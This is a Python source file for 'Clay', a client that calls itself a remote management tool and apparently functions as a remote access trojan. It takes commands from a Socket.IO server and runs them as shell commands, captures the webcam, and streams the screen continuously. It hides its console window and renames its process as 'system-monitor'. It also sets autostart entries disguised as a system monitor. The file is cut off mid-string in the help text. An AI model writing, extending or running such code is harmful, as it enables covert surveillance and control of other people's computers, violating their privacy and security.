import base64
import ctypes
import logging
import os
import platform
import random
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
from typing import Tuple, Optional, Any, Dict, List

# 第三方库导入
import cv2
import psutil
import socketio
from PIL import Image
from mss import mss

# 导入配置项
from config import (
    SERVER_URL, HEARTBEAT_INTERVAL, RECONNECT_DELAY, SCREENSHOT_INTERVAL,
    SCREENSHOT_QUALITY, SCREENSHOT_SCALE, HIDE_PROCESS, PROCESS_NAME,
    APP_NAME, LINUX_APP_NAME, MACOS_APP_NAME,
    COMMAND_TIMEOUT, TEMP_DIR
)

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(os.path.join(TEMP_DIR, 'clay_client.log'))
    ]
)
logger = logging.getLogger('ClayClient')


class ThreadSafeState:
    """线程安全的状态管理器"""

    def __init__(self):
        self._lock = threading.RLock()
        self._state = {}

    def set(self, key: str, value: Any) -> None:
        with self._lock:
            self._state[key] = value

    def get(self, key: str, default: Any = None) -> Any:
        with self._lock:
            return self._state.get(key, default)


class ConfigManager:
    """配置管理器"""

    @staticmethod
    def get_script_path() -> Optional[str]:
        try:
            if getattr(sys, 'frozen', False):
                return os.path.abspath(sys.executable)
            else:
                return os.path.abspath(__file__)
        except Exception as e:
            logger.error(f"获取脚本路径失败: {e}")
            return None


class SystemInfoProvider:
    """系统信息提供器"""

    @staticmethod
    def get_hostname_and_os() -> Tuple[str, str]:
        try:
            hostname = platform.node()
            os_info = f"{platform.system()} {platform.release()}"
            return hostname, os_info
        except Exception as e:
            logger.error(f"获取系统信息失败: {e}")
            return "Unknown", "Unknown"


class ProcessManager:
    """进程管理器"""

    @staticmethod
    def hide_console_window() -> bool:
        if platform.system() == "Windows":
            try:
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd != 0:
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
                    return True
            except Exception as e:
                logger.error(f"隐藏控制台窗口失败: {e}")
        return False

    @staticmethod
    def set_process_name(name: str = PROCESS_NAME) -> bool:
        try:
            if platform.system() == "Windows":
                ctypes.windll.kernel32.SetConsoleTitleW(name)
                return True
            elif platform.system() in ["Linux", "Darwin"]:
                try:
                    import prctl
                    prctl.set_name(name)
                    return True
                except ImportError:
                    logger.warning("prctl模块未安装，无法在Unix系统上修改进程名称")
            return False
        except Exception as e:
            logger.error(f"修改进程名称失败: {e}")
            return False


class AutostartManager:
    """自启动管理器"""

    @staticmethod
    def set_autostart(enable: bool = True) -> Tuple[bool, str]:
        script_path = ConfigManager.get_script_path()
        if not script_path:
            logger.error("无法获取脚本路径，无法设置自启动")
            return False, "无法获取脚本路径，无法设置自启动"

        os_name = platform.system()
        logger.info(f"{'设置' if enable else '取消'}开机自启动 (系统: {os_name})")

        try:
            if os_name == "Windows":
                return AutostartManager._set_autostart_windows(enable, script_path)
            elif os_name == "Linux":
                return AutostartManager._set_autostart_linux(enable, script_path)
            elif os_name == "Darwin":
                return AutostartManager._set_autostart_macos(enable, script_path)
            else:
                logger.error(f"不支持的操作系统: {os_name}")
                return False, f"不支持的操作系统: {os_name}"
        except Exception as e:
            logger.error(f"设置自启动失败: {str(e)}")
            return False, f"设置自启动失败: {str(e)}"

    @staticmethod
    def _set_autostart_windows(enable: bool, script_path: str) -> Tuple[bool, str]:
        import winreg as reg
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_ALL_ACCESS)
            if enable:
                reg.SetValueEx(key, APP_NAME, 0, reg.REG_SZ, script_path)
                key.Close()
                logger.info(f"Windows 自启动已开启: {script_path}")
                return True, "Windows 自启动已开启"
            else:
                try:
                    reg.DeleteValue(key, APP_NAME)
                    key.Close()
                    logger.info("Windows 自启动已关闭")
                    return True, "Windows 自启动已关闭"
                except FileNotFoundError:
                    key.Close()
                    logger.info("Windows 自启动项不存在，无需关闭")
                    return True, "Windows 自启动项不存在，无需关闭"
        except PermissionError:
            logger.error("设置自启动失败，需要管理员权限")
            return False, "设置自启动失败，需要管理员权限"
        except Exception as e:
            logger.error(f"Windows 设置自启动失败: {str(e)}")
            return False, f"Windows 设置自启动失败: {str(e)}"

    @staticmethod
    def _set_autostart_linux(enable: bool, script_path: str) -> Tuple[bool, str]:
        autostart_dir = os.path.expanduser("~/.config/autostart")
        desktop_file = os.path.join(autostart_dir, f"{LINUX_APP_NAME}.desktop")

        try:
            os.makedirs(autostart_dir, exist_ok=True)
            if enable:
                with open(desktop_file, "w") as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Comment=System monitoring service
Exec={sys.executable} "{script_path}"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
                os.chmod(desktop_file, 0o755)
                logger.info(f"Linux 自启动已开启: {desktop_file}")
                return True, "Linux 自启动已开启"
            else:
                if os.path.exists(desktop_file):
                    os.remove(desktop_file)
                    logger.info("Linux 自启动已关闭")
                    return True, "Linux 自启动已关闭"
                else:
                    logger.info("Linux 自启动项不存在，无需关闭")
                    return True, "Linux 自启动项不存在，无需关闭"
        except Exception as e:
            logger.error(f"Linux 设置自启动失败: {str(e)}")
            return False, f"Linux 设置自启动失败: {str(e)}"

    @staticmethod
    def _set_autostart_macos(enable: bool, script_path: str) -> Tuple[bool, str]:
        plist_file = os.path.expanduser(f"~/Library/LaunchAgents/com.{MACOS_APP_NAME}.agent.plist")

        try:
            if enable:
                with open(plist_file, "w") as f:
                    f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{MACOS_APP_NAME}.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
""")
                subprocess.run(["launchctl", "load", plist_file], check=True)
                logger.info(f"macOS 自启动已开启: {plist_file}")
                return True, "macOS 自启动已开启"
            else:
                if os.path.exists(plist_file):
                    subprocess.run(["launchctl", "unload", plist_file], check=True)
                    os.remove(plist_file)
                    logger.info("macOS 自启动已关闭")
                    return True, "macOS 自启动已关闭"
                else:
                    logger.info("macOS 自启动项不存在，无需关闭")
                    return True, "macOS 自启动项不存在，无需关闭"
        except subprocess.CalledProcessError as e:
            logger.error(f"macOS launchctl 命令执行失败: {str(e)}")
            return False, f"macOS launchctl 命令执行失败: {str(e)}"
        except Exception as e:
            logger.error(f"macOS 设置自启动失败: {str(e)}")
            return False, f"macOS 设置自启动失败: {str(e)}"

    @staticmethod
    def check_autostart_status() -> Tuple[bool, str]:
        script_path = ConfigManager.get_script_path()
        if not script_path:
            logger.error("无法获取脚本路径，无法检查自启动状态")
            return False, "无法获取脚本路径，无法检查自启动状态"

        os_name = platform.system()
        logger.debug(f"检查自启动状态 (系统: {os_name})")

        try:
            if os_name == "Windows":
                return AutostartManager._check_autostart_windows(script_path)
            elif os_name == "Linux":
                return AutostartManager._check_autostart_linux(script_path)
            elif os_name == "Darwin":
                return AutostartManager._check_autostart_macos(script_path)
            else:
                logger.error(f"不支持的操作系统: {os_name}")
                return False, f"不支持的操作系统: {os_name}"
        except Exception as e:
            logger.error(f"检查自启动状态失败: {str(e)}")
            return False, f"检查自启动状态失败: {str(e)}"

    @staticmethod
    def _check_autostart_windows(script_path: str) -> Tuple[bool, str]:
        import winreg as reg
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_READ)
            value, _ = reg.QueryValueEx(key, APP_NAME)
            key.Close()
            is_enabled = value == script_path
            status_msg = "Windows 自启动已开启" if is_enabled else "Windows 自启动路径不匹配"
            return is_enabled, status_msg
        except FileNotFoundError:
            return False, "Windows 自启动已关闭"
        except Exception as e:
            logger.error(f"Windows 检查自启动失败: {str(e)}")
            return False, f"Windows 检查自启动失败: {str(e)}"

    @staticmethod
    def _check_autostart_linux(script_path: str) -> Tuple[bool, str]:
        desktop_file = os.path.expanduser(f"~/.config/autostart/{LINUX_APP_NAME}.desktop")

        try:
            if not os.path.exists(desktop_file):
                return False, "Linux 自启动已关闭"

            with open(desktop_file, "r") as f:
                content = f.read()

            expected_exec = f"Exec={sys.executable} \"{script_path}\""
            is_enabled = expected_exec in content
            status_msg = "Linux 自启动已开启" if is_enabled else "Linux 自启动配置不匹配"
            return is_enabled, status_msg
        except Exception as e:
            logger.error(f"Linux 检查自启动失败: {str(e)}")
            return False, f"Linux 检查自启动失败: {str(e)}"

    @staticmethod
    def _check_autostart_macos(script_path: str) -> Tuple[bool, str]:
        plist_file = os.path.expanduser(f"~/Library/LaunchAgents/com.{MACOS_APP_NAME}.agent.plist")

        try:
            if not os.path.exists(plist_file):
                return False, "macOS 自启动已关闭"

            result = subprocess.run(
                ["launchctl", "list", f"com.{MACOS_APP_NAME}.agent"],
                capture_output=True,
                text=True
            )

            if result.returncode != 0:
                return False, "macOS 自启动已关闭"

            with open(plist_file, "r") as f:
                content = f.read()

            expected_path = f"<string>{script_path}</string>"
            is_enabled = expected_path in content
            status_msg = "macOS 自启动已开启" if is_enabled else "macOS 自启动配置不匹配"
            return is_enabled, status_msg
        except Exception as e:
            logger.error(f"macOS 检查自启动失败: {str(e)}")
            return False, f"macOS 检查自启动失败: {str(e)}"


class CommandExecutor:
    """命令执行器"""

    def __init__(self, sio_client):
        self.sio = sio_client
        self.current_working_directory = os.getcwd()
        self.current_processes = set()
        self.max_concurrent_commands = 5  # 限制最大并发命令数

    def execute_shutdown(self, args=None) -> Tuple[bool, str]:
        logger.info("收到关机命令，准备执行...")
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 1 /f")
            elif platform.system() in ["Linux", "Darwin"]:
                os.system("sudo shutdown now")
            else:
                logger.error(f"不支持的操作系统: {platform.system()}")
                return False, f"不支持的操作系统: {platform.system()}"
            logger.info("关机命令已发送")
            return True, "关机命令已发送"
        except Exception as e:
            logger.error(f"执行关机命令失败: {e}")
            return False, f"执行关机命令失败: {e}"

    def execute_lock(self, args=None) -> Tuple[bool, str]:
        logger.info("收到锁屏命令，准备执行...")
        try:
            if platform.system() == "Windows":
                os.system("rundll32.exe user32.dll,LockWorkStation")
            elif platform.system() == "Linux":
                os.system(
                    "xdg-screensaver lock || gnome-screensaver-command -l || cinnamon-screensaver-command -l || mate-screensaver-command -l")
            elif platform.system() == "Darwin":
                os.system("/System/Library/CoreServices/Menu\\ Extras/User.menu/Contents/Resources/CGSession -suspend")
            else:
                logger.error(f"不支持的操作系统: {platform.system()}")
                self.sio.emit('command_result', {'command': 'lock', 'success': False,
                                                 'message': f'不支持的操作系统: {platform.system()}'})
                return False, f"不支持的操作系统: {platform.system()}"
            logger.info("锁屏命令已执行")
            self.sio.emit('command_result', {'command': 'lock', 'success': True, 'message': '锁屏命令已执行'})
            return True, "锁屏命令已执行"
        except Exception as e:
            logger.error(f"执行锁屏命令失败: {e}")
            self.sio.emit('command_result', {'command': 'lock', 'success': False, 'message': f'执行锁屏命令失败: {e}'})
            return False, f"执行锁屏命令失败: {e}"

    def execute_shell_command(self, command: str) -> None:
        logger.info(f"准备执行shell命令: [{command}]")

        # 限制并发命令数
        if len(self.current_processes) >= self.max_concurrent_commands:
            logger.warning("达到最大并发命令数，拒绝执行新命令")
            self.sio.emit('terminal_output', {'output': "[CLAY] ⚠️ 达到最大并发命令数，拒绝执行新命令\n"})
            return

        start_time = time.time()
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] 🚀 执行命令: {command}\n"})
        self.sio.emit('terminal_output', {'output': "--------------------------------------------\n"})

        # 特殊处理cd命令
        if command.strip().lower().startswith('cd '):
            self._handle_cd_command(command, start_time)
            return

        # 执行普通命令
        self._execute_regular_command(command, start_time)

    def _handle_cd_command(self, command: str, start_time: float) -> None:
        try:
            target_dir = command[3:].strip()
            logger.debug(f"处理cd命令，目标目录: {target_dir}")

            # 处理Windows环境变量
            if '%' in target_dir:
                process = subprocess.Popen(
                    f'echo {target_dir}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                output, _ = process.communicate()
                target_dir = output.strip()

            # 处理相对路径
            if not os.path.isabs(target_dir):
                target_dir = os.path.join(self.current_working_directory, target_dir)

            # 尝试切换目录
            if os.path.exists(target_dir) and os.path.isdir(target_dir):
                os.chdir(target_dir)
                self.current_working_directory = os.getcwd()
                logger.info(f"已切换到目录: {self.current_working_directory}")

                self.sio.emit('terminal_output', {'output': f"已切换到目录: {self.current_working_directory}\n"})

                # 显示目录内容
                process = subprocess.Popen(
                    'dir' if platform.system() == "Windows" else 'ls',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=self.current_working_directory
                )
                stdout, stderr = process.communicate()
                self.sio.emit('terminal_output', {'output': stdout})
                if stderr:
                    self.sio.emit('terminal_output', {'output': f"错误: {stderr}\n"})

                self._update_terminal_prompt()
                end_time = time.time()
                self.sio.emit('terminal_output',
                              {'output': f"\n[CLAY] ✅ 命令执行成功 (耗时: {end_time - start_time:.2f}秒)\n"})
                return
            else:
                logger.warning(f"目录不存在: {target_dir}")
                self.sio.emit('terminal_output', {'output': f"错误: 目录不存在 - {target_dir}\n"})
                end_time = time.time()
                self.sio.emit('terminal_output',
                              {'output': f"\n[CLAY] ❌ 命令执行失败 (耗时: {end_time - start_time:.2f}秒)\n"})
                return
        except Exception as e:
            logger.error(f"处理cd命令时出错: {str(e)}")
            self.sio.emit('terminal_output', {'output': f"处理cd命令时出错: {str(e)}\n"})
            end_time = time.time()
            self.sio.emit('terminal_output',
                          {'output': f"\n[CLAY] ❌ 命令执行失败 (耗时: {end_time - start_time:.2f}秒)\n"})
            return

    def _execute_regular_command(self, command: str, start_time: float) -> None:
        try:
            logger.debug(f"执行普通命令: {command}")
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                cwd=self.current_working_directory
            )

            self.current_processes.add(process)
            line_count = 0

            try:
                # 实时发送标准输出
                for line in process.stdout:
                    output = line.rstrip()
                    line_count += 1
                    self.sio.emit('terminal_output', {'output': output + '\n'})

                # 发送错误输出
                stderr_lines = 0
                for line in process.stderr:
                    output = line.rstrip()
                    stderr_lines += 1
                    if stderr_lines == 1:
                        self.sio.emit('terminal_output', {'output': "\n[CLAY] ⚠️ 错误输出:\n"})
                    self.sio.emit('terminal_output', {'output': "  " + output + '\n'})

                # 等待进程完成
                return_code = process.wait(timeout=COMMAND_TIMEOUT)
                execution_time = time.time() - start_time

                self.sio.emit('terminal_output', {'output': "--------------------------------------------\n"})
                if return_code == 0:
                    if line_count > 0:
                        logger.info(f"命令执行成功，输出{line_count}行，耗时{execution_time:.2f}秒")
                        self.sio.emit('terminal_output', {
                            'output': f"[CLAY] ✅ 命令执行成功 (耗时: {execution_time:.2f}秒, 输出: {line_count}行)\n\n"})
                    else:
                        logger.info(f"命令执行成功，无输出，耗时{execution_time:.2f}秒")
                        self.sio.emit('terminal_output',
                                      {'output': f"[CLAY] ✅ 命令执行成功，无输出 (耗时: {execution_time:.2f}秒)\n\n"})
                else:
                    logger.warning(f"命令返回错误代码: {return_code}，耗时{execution_time:.2f}秒")
                    self.sio.emit('terminal_output',
                                  {
                                      'output': f"[CLAY] ❌ 命令返回错误代码: {return_code} (耗时: {execution_time:.2f}秒)\n\n"})

            except subprocess.TimeoutExpired:
                logger.error(f"命令执行超时({COMMAND_TIMEOUT}秒)，已强制终止: {command}")
                process.kill()
                self.sio.emit('terminal_output',
                              {'output': f"\n[CLAY] ⏱️ 命令执行超时({COMMAND_TIMEOUT}秒)，已强制终止\n\n"})

            if process in self.current_processes:
                self.current_processes.remove(process)

        except Exception as e:
            logger.error(f"执行命令出错: {str(e)}")
            if 'process' in locals() and process in self.current_processes:
                self.current_processes.remove(process)
            error_message = f"\n[CLAY] 🛑 执行出错: {str(e)}\n\n"
            self.sio.emit('terminal_output', {'output': error_message})

    def execute_capture_webcam(self) -> Tuple[bool, str]:
        logger.info("准备捕获摄像头画面...")
        self.sio.emit('terminal_output', {'output': "\n[CLAY] 📷 正在尝试访问摄像头...\n"})

        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                error_msg = "无法访问摄像头，请确保摄像头已连接且未被其他程序占用"
                logger.error(error_msg)
                self.sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
                return False, error_msg

            # 提高摄像头分辨率以获得更清晰的画面
            # 尝试设置更高的分辨率（按优先级排序）
            resolutions = [
                (1920, 1080),  # 1080p
                (1280, 720),  # 720p
                (1024, 768),  # XGA
                (800, 600),  # SVGA
                (640, 480)  # VGA
            ]

            resolution_set = False
            for width, height in resolutions:
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                actual_width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
                actual_height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)

                # 检查是否成功设置了分辨率
                if actual_width == width and actual_height == height:
                    logger.info(f"摄像头分辨率已设置为: {width}x{height}")
                    resolution_set = True
                    break

            if not resolution_set:
                logger.warning("无法设置理想的摄像头分辨率，使用默认分辨率")

            # 读取一帧
            ret, frame = cap.read()
            if not ret:
                error_msg = "无法从摄像头读取图像"
                logger.error(error_msg)
                self.sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
                cap.release()
                return False, error_msg

            # 获取实际帧尺寸
            height, width = frame.shape[:2]
            logger.info(f"实际捕获的摄像头画面尺寸: {width}x{height}")

            # 根据画面尺寸调整压缩参数以平衡质量和大小
            if width >= 1920 or height >= 1080:
                # 1080p及以上使用较高质量
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 85]
                scale_percent = 75  # 适度缩小以减少传输大小
            elif width >= 1280 or height >= 720:
                # 720p使用中等质量
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                scale_percent = 80
            else:
                # 较低分辨率使用标准质量
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 75]
                scale_percent = 85

            # 调整大小（如果需要）
            if scale_percent < 100:
                new_width = int(width * scale_percent / 100)
                new_height = int(height * scale_percent / 100)
                resized = cv2.resize(frame, (new_width, new_height), interpolation=cv2.INTER_AREA)
                logger.debug(f"调整摄像头画面大小: {width}x{height} -> {new_width}x{new_height}")
            else:
                resized = frame

            # 压缩图像
            _, buffer = cv2.imencode('.jpg', resized, encode_param)

            # 转换为base64并发送
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            logger.info(f"摄像头画面已捕获，大小: {len(jpg_as_text) / 1024:.2f} KB")
            self.sio.emit('webcam_frame', {'image_data': jpg_as_text, 'client_id': self.sio.sid})

            cap.release()
            cv2.destroyAllWindows()  # 确保释放所有窗口资源
            self.sio.emit('terminal_output', {'output': f"[CLAY] ✅ 摄像头画面已捕获并发送\n"})
            return True, "摄像头画面已捕获并发送"

        except Exception as e:
            error_msg = f"捕获摄像头画面时出错: {str(e)}"
            logger.error(error_msg)
            self.sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
            return False, error_msg

    def _update_terminal_prompt(self) -> None:
        dir_name = os.path.basename(self.current_working_directory) or self.current_working_directory
        self.sio.emit('terminal_prompt_update', {
            'prompt': f"{dir_name}",
            'full_path': self.current_working_directory
        })


class ScreenMonitor:
    """屏幕监控器"""

    def __init__(self, sio_client):
        self.sio = sio_client
        self.state = ThreadSafeState()
        self.state.set('monitoring', False)
        self.state.set('thread', None)
        self.state.set('stop_event', threading.Event())
        self.state.set('quality', SCREENSHOT_QUALITY)
        self.state.set('scale', SCREENSHOT_SCALE)
        self.executor = ThreadPoolExecutor(max_workers=2)  # 使用线程池复用线程

    def capture_screenshot(self) -> Tuple[bool, Any, Optional[Tuple[int, int]]]:
        try:
            with mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)

                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

                # 应用缩放
                scale = self.state.get('scale')
                if scale != 1.0:
                    new_width = int(img.width * scale)
                    new_height = int(img.height * scale)
                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)

                # 使用BytesIO代替临时文件以减少磁盘I/O
                buffer = BytesIO()
                quality = self.state.get('quality')
                img.save(buffer, format="JPEG", quality=quality)
                img_data = buffer.getvalue()
                buffer.close()

                # 转换为base64
                base64_data = base64.b64encode(img_data).decode('utf-8')
                return True, base64_data, img.size

        except Exception as e:
            logger.error(f"屏幕截图失败: {e}")
            return False, str(e), None

    def monitoring_loop(self) -> None:
        logger.info("屏幕监视线程已启动，间隔: %s秒，质量: %s%%，缩放: %sx",
                    SCREENSHOT_INTERVAL, self.state.get('quality'), self.state.get('scale'))
        self.sio.emit('terminal_output', {'output': "\n[CLAY] 🖥️ 屏幕监视已开始\n"})

        consecutive_failures = 0
        stop_event = self.state.get('stop_event')

        while not stop_event.is_set():
            success, data, size = self.capture_screenshot()

            if success:
                consecutive_failures = 0
                self.sio.emit('screen_frame', {
                    'image_data': data,
                    'timestamp': time.time(),
                    'width': size[0],
                    'height': size[1],
                    'client_id': self.sio.sid
                })
                # 减少日志频率
                if random.randint(0, 10) == 0:
                    logger.debug(f"屏幕截图已发送，大小: {size[0]}x{size[1]}，数据长度: {len(data) / 1024:.2f} KB")

                # 动态调整等待时间 based on CPU usage
                cpu_percent = psutil.cpu_percent()
                if cpu_percent > 80:
                    wait_time = SCREENSHOT_INTERVAL * 2
                else:
                    wait_time = SCREENSHOT_INTERVAL
                stop_event.wait(wait_time)
            else:
                consecutive_failures += 1
                if consecutive_failures <= 3:
                    logger.warning(f"屏幕截图失败: {data}")
                    self.sio.emit('terminal_output', {'output': f"[CLAY] ⚠️ 屏幕截图失败: {data}\n"})
                elif consecutive_failures == 4:
                    logger.warning("屏幕截图多次失败，将减少错误提示")
                    self.sio.emit('terminal_output', {'output': f"[CLAY] ⚠️ 屏幕截图多次失败，将减少错误提示\n"})

                wait_time = min(5, SCREENSHOT_INTERVAL) if consecutive_failures < 5 else 10
                stop_event.wait(wait_time)

        self.state.set('monitoring', False)
        logger.info("屏幕监视线程已停止")
        self.sio.emit('terminal_output', {'output': "\n[CLAY] 🖥️ 屏幕监视已停止\n"})

    def start(self) -> Tuple[bool, str]:
        if self.state.get('monitoring'):
            logger.info("屏幕监视已在运行中，忽略启动请求")
            return False, "屏幕监视已在运行中"

        stop_event = self.state.get('stop_event')
        stop_event.clear()
        logger.info(f"准备启动屏幕监视，间隔: {SCREENSHOT_INTERVAL}秒，质量: {self.state.get('quality')}%")

        # 使用线程池提交任务
        future = self.executor.submit(self.monitoring_loop)
        self.state.set('future', future)

        self.state.set('monitoring', True)
        logger.info("屏幕监视已成功启动")
        return True, "屏幕监视已启动"

    def stop(self) -> Tuple[bool, str]:
        if not self.state.get('monitoring'):
            logger.info("屏幕监视未在运行中，忽略停止请求")
            return False, "屏幕监视未在运行中"

        logger.info("正在停止屏幕监视...")
        stop_event = self.state.get('stop_event')
        stop_event.set()

        future = self.state.get('future')
        if future:
            try:
                future.result(timeout=5)
            except:
                logger.warning("屏幕监视线程未能正常终止")

        self.state.set('monitoring', False)
        logger.info("屏幕监视已成功停止")
        return True, "屏幕监视已停止"

    def set_quality(self, quality: int) -> Tuple[bool, str]:
        try:
            quality = int(quality)
            if 0 <= quality <= 100:
                old_quality = self.state.get('quality')
                self.state.set('quality', quality)
                logger.info(f"截图质量已从 {old_quality}% 更改为 {quality}%")
                return True, f"截图质量已设置为 {quality}%"
            else:
                logger.warning(f"无效的质量值: {quality}，必须在0-100之间")
                return False, "质量值必须在0-100之间"
        except ValueError:
            logger.warning(f"无效的质量值: {quality}，必须是整数")
            return False, "质量值必须是整数"

    def set_scale(self, scale: float) -> Tuple[bool, str]:
        try:
            scale = float(scale)
            if 0.1 <= scale <= 1.0:
                old_scale = self.state.get('scale')
                self.state.set('scale', scale)
                logger.info(f"截图缩放比例已从 {old_scale:.1f}x 更改为 {scale:.1f}x")
                return True, f"截图缩放比例已设置为 {scale:.1f}x"
            else:
                logger.warning(f"无效的缩放比例: {scale}，必须在0.1-1.0之间")
                return False, "缩放比例必须在0.1-1.0之间"
        except ValueError:
            logger.warning(f"无效的缩放比例: {scale}，必须是数字")
            return False, "缩放比例必须是数字"

    def execute_single_screenshot(self, quality: int) -> Tuple[bool, str]:
        logger.info(f"执行单次屏幕截图，质量: {quality}%")
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] 🖥️ 正在捕获屏幕截图 (质量: {quality}%)...\n"})

        original_quality = self.state.get('quality')
        self.set_quality(quality)

        try:
            success, data, size = self.capture_screenshot()
            if success:
                self.sio.emit('screen_frame', {
                    'image_data': data,
                    'timestamp': time.time(),
                    'width': size[0],
                    'height': size[1],
                    'client_id': self.sio.sid
                })
                data_size_kb = len(data) / 1024
                logger.info(f"屏幕截图已捕获并发送，大小: {size[0]}x{size[1]}，数据大小: {data_size_kb:.2f} KB")
                self.sio.emit('terminal_output',
                              {'output': f"[CLAY] ✅ 屏幕截图已捕获并发送 (大小: {data_size_kb:.2f} KB)\n"})
                return True, "屏幕截图已捕获并发送"
            else:
                error_msg = f"屏幕截图失败: {data}"
                logger.error(error_msg)
                self.sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
                return False, error_msg
        finally:
            logger.debug(f"恢复原始质量设置: {original_quality}%")
            self.set_quality(original_quality)


class CommandHandler:
    """命令处理器"""

    def __init__(self, client):
        self.client = client
        self.sio = client.sio
        self.executor = client.command_executor
        self.screen_monitor = client.screen_monitor

    def handle(self, data: Dict[str, Any]) -> None:
        command = data.get('command', '').strip()
        logger.info(f"收到命令请求: {command}")

        handlers = {
            'clay help': self._handle_help,
            'clay info': self._handle_info,
            'clay status': self._handle_status,
            'capture_webcam': self._handle_capture_webcam,
            'clay autostart on': self._handle_autostart_on,
            'clay autostart off': self._handle_autostart_off,
            'clay autostart status': self._handle_autostart_status,
            'clay hide': self._handle_hide,
            'clay screen on': self._handle_screen_on,
            'clay screen off': self._handle_screen_off,
            'lock': self._handle_lock,
            'shutdown': self._handle_shutdown,
        }

        # 前缀命令处理
        if command.lower().startswith('clay screen quality '):
            self._handle_screen_quality(command)
            return
        elif command.lower().startswith('clay screen scale '):
            self._handle_screen_scale(command)
            return
        elif command.lower().startswith('clay screen capture '):
            self._handle_screen_capture(command)
            return

        # 查找并执行处理函数
        handler = handlers.get(command.lower())
        if handler:
            handler()
        else:
            self.executor.execute_shell_command(command)

    def _handle_help(self) -> None:
        self._show_clay_help()

    def _handle_info(self) -> None:
        self._show_system_info()

    def _handle_status(self) -> None:
        self._show_clay_status()

    def _handle_capture_webcam(self) -> None:
        self.executor.execute_capture_webcam()

    def _handle_autostart_on(self) -> None:
        success, message = AutostartManager.set_autostart(True)
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})

    def _handle_autostart_off(self) -> None:
        success, message = AutostartManager.set_autostart(False)
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})

    def _handle_autostart_status(self) -> None:
        is_enabled, message = AutostartManager.check_autostart_status()
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'🟢' if is_enabled else '🔴'} {message}\n"})

    def _handle_hide(self) -> None:
        success = False
        message = ""
        if ProcessManager.hide_console_window():
            success = True
            message = "控制台窗口已隐藏"
        if ProcessManager.set_process_name("system-monitor"):
            success = True
            message += "，进程名称已修改"
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})

    def _handle_screen_on(self) -> None:
        success, message = self.screen_monitor.start()
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})

    def _handle_screen_off(self) -> None:
        success, message = self.screen_monitor.stop()
        self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})

    def _handle_screen_quality(self, command: str) -> None:
        try:
            quality = command.split(' ')[3]
            success, message = self.screen_monitor.set_quality(quality)
            self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        except IndexError:
            self.sio.emit('terminal_output', {'output': "\n[CLAY] ❌ 请指定质量值 (0-100)\n"})

    def _handle_screen_scale(self, command: str) -> None:
        try:
            scale = command.split(' ')[3]
            success, message = self.screen_monitor.set_scale(scale)
            self.sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        except IndexError:
            self.sio.emit('terminal_output', {'output': "\n[CLAY] ❌ 请指定缩放比例 (0.1-1.0)\n"})

    def _handle_screen_capture(self, command: str) -> None:
        try:
            quality = command.split(' ')[3]
            self.screen_monitor.execute_single_screenshot(quality)
        except IndexError:
            self.screen_monitor.execute_single_screenshot(60)  # 默认使用较低质量

    def _handle_lock(self) -> None:
        self.executor.execute_lock()

    def _handle_shutdown(self) -> None:
        self.executor.execute_shutdown()

    def _show_clay_help(self) -> None:
        help_text = """
[CLAY] 📚 Clay 远程管理客户端帮助

基本命令:
